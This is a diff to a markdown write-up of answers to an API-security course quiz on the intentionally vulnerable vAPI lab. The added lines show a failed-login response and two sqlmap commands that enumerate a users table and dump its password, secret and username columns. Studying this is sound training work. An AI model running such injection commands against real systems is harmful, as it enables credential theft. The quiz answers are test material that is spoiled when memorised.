@@ -188,7 +188,38 @@ Anyhow, if you host your own instance of crAPI, you can simply change the
 
 >Which of the following tools is ideal for fuzzing deep into an individual request?
 
-* Burp Suite Intruder
+* Burp Suite Intruder  
+
+>What is the response status code from a failed login attempt to /vapi/api8/user/login?  
+
+* 403
+
+```
+sqlmap -u http://vapi.apisec.ai/vapi/api8/user/login --data="username=u&password=p" -p username -D vapi -T a_p_i8_users --columns
+```  
+
+>What fields are included in the response body of a failed request to /vapi/api8/user/login?  
+
+```
+HTTP/1.1 403 Forbidden
+Host: vapi.apisec.ai
+Date: Sun, 03 Nov 2024 14:06:47 GMT
+Connection: close
+X-Powered-By: PHP/7.4.33
+Cache-Control: no-cache, private
+Date: Sun, 03 Nov 2024 14:06:47 GMT
+Content-Type: application/json
+
+{"success":"false","cause":"IncorrectUsernameOrPassword"}
+```  
+
+>Which database does vAPI use?  
+
+* MySQL  
+
+```
+sqlmap -u http://vapi.apisec.ai/vapi/api8/user/login --data="username=u&password=p" -p username -D vapi -T a_p_i8_users -C password,secret,username --dump
+```  
 
 ----  
 
